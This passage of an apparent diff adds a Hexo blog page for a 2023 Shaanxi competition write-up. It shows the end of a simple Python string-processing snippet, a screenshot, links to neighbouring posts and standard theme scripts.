将新字符添加到输出字符串末尾</span><br><span class="line"></span><br><span class="line">  output_str += new_char</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">\# 输出结果字符串</span><br><span class="line"></span><br><span class="line">print(&quot;处理后的字符串为：&quot;, output_str)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185533883.png" alt="image-20230603185533883"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/07/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          文件包含
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/07/02/rce2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">rce2</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="2023陕西省赛" data-title="2023陕西省赛" data-url="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/"  data-images="touxiang/t.jpg" data-content="2023陕西省赛">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
